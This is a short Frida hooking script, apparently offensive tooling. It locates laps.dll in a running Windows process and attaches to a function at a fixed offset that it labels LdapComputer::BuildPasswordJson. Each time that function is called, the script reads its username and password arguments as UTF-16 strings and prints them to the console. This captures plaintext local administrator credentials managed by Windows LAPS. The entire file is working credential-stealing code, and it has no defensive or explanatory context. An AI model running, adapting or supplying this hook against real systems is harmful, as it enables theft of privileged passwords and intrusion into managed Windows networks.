const offset = 0x24998; // Update me - offset to the target function

const moduleName = 'laps.dll';
const targetModule = Process.enumerateModules().find(mod => mod.name.toLowerCase().includes(moduleName.toLowerCase()));

if (targetModule !== undefined) {
    const baseAddr = targetModule.base;
    const targetFuncAddr = baseAddr.add(offset);
    console.log(`[+] Base address of ${moduleName}: ${baseAddr}`);   
    console.log(`[+] Hooking function at ${targetFuncAddr} (offset 0x${offset.toString(16)})`);

    Interceptor.attach(targetFuncAddr, {
        onEnter: function (args) {
            console.log('[GET] LdapComputer::BuildPasswordJson');
            
                    const username = args[1].readUtf16String();
                    const password = args[2].readUtf16String();
            
                    console.log(`--> Username (args[1]): ${username} / Password (args[2]): ${password}`);
        },
        onLeave: function (retval) {
            // No operation
        }
    });

} else {
    console.error(`[-] Could not find base address for ${moduleName}`);
}

